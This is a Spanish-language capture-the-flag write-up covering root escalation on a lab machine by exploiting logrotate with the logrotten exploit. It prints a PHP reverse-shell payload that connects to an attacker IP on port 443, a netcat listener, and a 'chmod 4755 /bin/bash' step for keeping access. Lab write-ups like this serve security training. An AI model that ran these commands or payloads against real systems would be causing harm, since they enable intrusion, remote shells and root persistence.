## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
ls -l
cd backups
ls -l
cat access.log
cat access.log.1
```

Aqui no tenemos mucha cosa que podemos hacer. Uzamos **pspy** para investigar el systema.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
./pspy64
```

pspy nos muestra que hay un `/usr/sbin/logrote` que se ejecuta a interval regular de tiempo.

```bash
uname -a
logrotate -v
```

En la maquina de atacante buscamos un exploit logrotate para escalada de privilegios

```bash
searchsploit logrot
searchsploit -m 47466
mv 47466.c logrotten.c
```

Copiamos el contenido en un fichero de la maquina victima y le quitamos todos los commentarios.

```bash
gcc logrotten.c -o logrotten
```

Creamos un fichero payloadfile malicioso

```bash
nano payloadfile


#!/bin/bash

php -r '$sock=fsockopen("10.10.17.51",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Nos ponemos en escucha por el puerto 443

```bash
nc -nlvp 443
```

Lanzamos el script

```bash
logrotten -p payloadfile /home/reader/backups/access.log
```

Nos conectamos nuevamente por ssh a la maquina victima para modificar el fichero `access.log`

```bash
ssh reader@10.10.10.176 -i id_rsa

echo "s4vitar" > backups/access.log
```

Esperamos un poco y ganamos accesso al systema. Pero se desconecta bastante rapido. Volvemos nuevamente a lanzar el script
y rapidamente colamos un `chmod 4755 /bin/bash` de seguida que ganamos accesso al systema antes que se desconnecte.

Desde una shell ssh ya podemos lanzar un `bash -p` y leer el fichero `root.txt`